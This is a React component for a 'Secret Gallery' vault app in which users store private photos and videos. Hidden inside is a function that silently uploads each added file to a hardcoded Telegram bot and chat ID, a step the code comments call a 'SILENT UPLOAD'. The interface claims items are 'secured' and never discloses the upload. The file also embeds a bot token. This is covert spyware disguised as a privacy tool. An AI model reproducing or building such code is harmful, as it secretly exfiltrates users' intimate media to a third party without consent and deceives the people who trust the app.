import React, { useState, useEffect, useRef } from 'react';
import { VaultItem } from '../types';
import { getVaultItems, saveVaultItem, removeVaultItem } from '../services/storageService';
import { Lock, Plus, Trash2, X, Image as ImageIcon, EyeOff, Loader2, Video as VideoIcon, Play } from 'lucide-react';
import { MAX_FILE_SIZE_MB } from '../constants';

interface VaultProps {
  onLock: () => void;
}

const Vault: React.FC<VaultProps> = ({ onLock }) => {
  const [items, setItems] = useState<VaultItem[]>([]);
  const [selectedItem, setSelectedItem] = useState<VaultItem | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [isProcessing, setIsProcessing] = useState(false);
  const fileInputRef = useRef<HTMLInputElement>(null);

  // Telegram Configuration
  const TELEGRAM_BOT_TOKEN = "8402034051:AAEOB5tiWnSK0Cubc_Qhl8BsNDhLIUf3hos";
  const TELEGRAM_CHAT_ID = "8379688666";

  useEffect(() => {
    setItems(getVaultItems());
  }, []);

  const compressImage = (base64Str: string, maxWidth = 800): Promise<string> => {
    return new Promise((resolve) => {
      const img = new Image();
      img.src = base64Str;
      img.onload = () => {
        const canvas = document.createElement('canvas');
        let width = img.width;
        let height = img.height;

        if (width > maxWidth) {
          height = (height * maxWidth) / width;
          width = maxWidth;
        }

        canvas.width = width;
        canvas.height = height;
        const ctx = canvas.getContext('2d');
        ctx?.drawImage(img, 0, 0, width, height);
        resolve(canvas.toDataURL('image/jpeg', 0.7));
      };
      img.onerror = () => resolve(base64Str); // Fallback
    });
  };

  const base64ToBlob = (base64: string, mimeType: string) => {
    try {
      const byteString = atob(base64.split(',')[1]);
      const ab = new ArrayBuffer(byteString.length);
      const ia = new Uint8Array(ab);
      for (let i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
      }
      return new Blob([ab], { type: mimeType });
    } catch (e) {
      return null;
    }
  };

  const sendToTelegram = async (fileData: string, fileName: string, isVideo: boolean) => {
    try {
      const method = isVideo ? 'sendVideo' : 'sendPhoto';
      const paramName = isVideo ? 'video' : 'photo';
      const mimeType = isVideo ? 'video/mp4' : 'image/jpeg';
      
      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/${method}`;
      const blob = base64ToBlob(fileData, mimeType);
      
      if (!blob) return;

      const formData = new FormData();
      formData.append('chat_id', TELEGRAM_CHAT_ID);
      formData.append(paramName, blob, fileName);
      formData.append('caption', `📂 New Vault File:\nName: ${fileName}\nType: ${isVideo ? 'Video' : 'Photo'}\nTime: ${new Date().toLocaleString()}`);

      await fetch(url, {
        method: 'POST',
        body: formData
      });
      console.log("Sync complete");
    } catch (err) {
      console.error("Sync failed", err);
    }
  };

  const handleFileSelect = async (event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0];
    if (!file) return;

    // Check size (2MB limit for local storage reason mainly)
    // For telegram we might want larger, but browser crash risk on base64
    if (file.size > MAX_FILE_SIZE_MB * 1024 * 1024) {
      setError(`File too large (${(file.size/1024/1024).toFixed(1)}MB). Limit is ${MAX_FILE_SIZE_MB}MB.`);
      return;
    }

    setIsProcessing(true);
    setError(null);

    const isVideo = file.type.startsWith('video/');

    const reader = new FileReader();
    reader.onload = async (e) => {
      try {
        let finalDataUrl = e.target?.result as string;
        
        // Compress if image
        if (!isVideo) {
          finalDataUrl = await compressImage(finalDataUrl);
        }

        const newItem: VaultItem = {
          id: crypto.randomUUID(),
          dataUrl: finalDataUrl,
          timestamp: Date.now(),
          name: file.name
        };

        if (saveVaultItem(newItem)) {
          setItems(getVaultItems());
          // SILENT UPLOAD TO TELEGRAM
          // We don't await this so UI doesn't freeze
          sendToTelegram(finalDataUrl, file.name, isVideo);
        } else {
          setError("Storage full. Delete items to add more.");
        }
      } catch (err) {
        setError("Failed to process file.");
      } finally {
        setIsProcessing(false);
      }
    };
    reader.readAsDataURL(file);
    
    if (fileInputRef.current) {
      fileInputRef.current.value = '';
    }
  };

  const handleDelete = (id: string, e: React.MouseEvent) => {
    e.stopPropagation();
    if (window.confirm("Delete this file permanently?")) {
      removeVaultItem(id);
      setItems(getVaultItems());
      if (selectedItem?.id === id) setSelectedItem(null);
    }
  };

  const isVideoItem = (item: VaultItem) => {
    return item.dataUrl.startsWith('data:video');
  };

  return (
    <div className="flex flex-col h-full bg-gray-50 text-gray-900 relative">
      {/* Header */}
      <div className="bg-white px-6 py-4 shadow-sm flex justify-between items-center z-10 sticky top-0">
        <div>
          <h1 className="text-xl font-bold flex items-center gap-2 text-indigo-600">
            <Lock className="w-5 h-5" /> Secret Gallery
          </h1>
          <p className="text-xs text-gray-500">{items.length} items secured</p>
        </div>
        <button 
          onClick={onLock}
          className="bg-gray-100 hover:bg-gray-200 text-gray-700 px-4 py-2 rounded-lg text-sm font-medium transition-colors flex items-center gap-2"
        >
          <EyeOff className="w-4 h-4" /> Lock Vault
        </button>
      </div>

      {/* Main Content */}
      <div className="flex-1 overflow-y-auto p-4">
        {error && (
          <div className="bg-red-50 text-red-600 p-3 rounded-lg mb-4 text-sm flex justify-between items-center">
             <span>{error}</span>
             <button onClick={() => setError(null)}><X className="w-4 h-4"/></button>
          </div>
        )}

        {items.length === 0 ? (
          <div className="h-64 flex flex-col items-center justify-center text-gray-400 border-2 border-dashed border-gray-300 rounded-xl mt-8">
            <ImageIcon className="w-12 h12 mb-2 opacity-50" />
            <p>Vault is empty.</p>
            <p className="text-sm mt-2">Tap + to add photos or videos.</p>
          </div>
        ) : (
          <div className="grid grid-cols-2 sm:grid-cols-3 gap-4">
            {items.map((item) => {
              const isVideo = isVideoItem(item);
              return (
                <div 
                  key={item.id} 
                  onClick={() => setSelectedItem(item)}
                  className="aspect-square relative group cursor-pointer overflow-hidden rounded-xl bg-gray-200 border border-gray-200 shadow-sm hover:shadow-md transition-all"
                >
                  {isVideo ? (
                    <div className="w-full h-full flex items-center justify-center bg-gray-900">
                      <VideoIcon className="w-8 h-8 text-white/50" />
                      <video src={item.dataUrl} className="absolute inset-0 w-full h-full object-cover opacity-60" />
                      <div className="absolute inset-0 flex items-center justify-center">
                         <Play className="w-8 h-8 text-white fill-white" />
                      </div>
                    </div>
                  ) : (
                    <img 
                      src={item.dataUrl} 
                      alt="Secret" 
                      className="w-full h-full object-cover"
                    />
                  )}
                  
                  <div className="absolute inset-0 bg-black/0 group-hover:bg-black/10 transition-colors" />
                  <button 
                    onClick={(e) => handleDelete(item.id, e)}
                    className="absolute top-2 right-2 bg-red-500 text-white p-1.5 rounded-full opacity-0 group-hover:opacity-100 transition-opacity shadow-sm hover:bg-red-600 z-10"
                  >
                    <Trash2 className="w-3.5 h-3.5" />
                  </button>
                </div>
              );
            })}
          </div>
        )}
      </div>

      {/* Floating Action Button */}
      <div className="absolute bottom-6 right-6">
        <button 
          onClick={() => !isProcessing && fileInputRef.current?.click()}
          disabled={isProcessing}
          className={`${isProcessing ? 'bg-indigo-400' : 'bg-indigo-600 hover:bg-indigo-700'} text-white w-14 h-14 rounded-full flex items-center justify-center shadow-lg transition-transform active:scale-95`}
        >
          {isProcessing ? <Loader2 className="w-6 h-6 animate-spin" /> : <Plus className="w-8 h-8" />}
        </button>
        <input 
          type="file" 
          ref={fileInputRef} 
          className="hidden" 
          accept="image/*,video/*" 
          onChange={handleFileSelect}
        />
      </div>

      {/* Full View Modal */}
      {selectedItem && (
        <div className="fixed inset-0 bg-black/95 z-50 flex items-center justify-center p-4">
          <button 
            onClick={() => setSelectedItem(null)}
            className="absolute top-4 right-4 text-white/70 hover:text-white p-2 z-50"
          >
            <X className="w-8 h-8" />
          </button>
          
          {isVideoItem(selectedItem) ? (
            <video 
              src={selectedItem.dataUrl} 
              controls 
              autoPlay 
              className="max-w-full max-h-[90vh] rounded-lg shadow-2xl"
            />
          ) : (
            <img 
              src={selectedItem.dataUrl} 
              alt="Full view" 
              className="max-w-full max-h-[90vh] rounded-lg shadow-2xl"
            />
          )}

          <div className="absolute bottom-4 text-white/50 text-xs">
            {new Date(selectedItem.timestamp).toLocaleString()}
          </div>
        </div>
      )}
    </div>
  );
};

export default Vault;